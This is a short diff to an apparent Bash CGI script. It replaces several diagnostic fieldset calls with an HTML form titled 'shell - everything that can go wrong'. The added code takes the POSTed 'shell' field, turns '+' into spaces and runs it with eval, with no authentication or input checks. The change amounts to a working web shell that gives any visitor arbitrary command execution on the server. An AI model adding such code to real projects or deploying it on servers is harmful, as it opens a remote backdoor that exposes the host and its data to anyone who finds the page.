@@ -6,10 +6,28 @@ cgi
 html
 input
 header
-output
-variables_fieldset
-log_fieldset
-input_test
-fcgiparams_fieldset
+
+echo "
+<fieldset><legend>shell - everything that can go wrong</legend>
+<form action='/cgi-bin/shell.cgi' method='post'>
+<table><tr>
+"
+if [[ ${POST[shell]} ]];then
+echo ${POST[shell]}
+TEMP=`echo ${POST[shell]} | sed 's/+/ /g'`
+eval ${TEMP}
+
+fi
+echo "
+<td class='stretch'><input class='stretch' type="text" name="shell"></td>
+<td><input type='submit'><td>
+</tr></table>
+</fieldset>
+</form>
+
+
+</div>
+"
+
 footer
 ###########################################################################################################################################################################################################################################
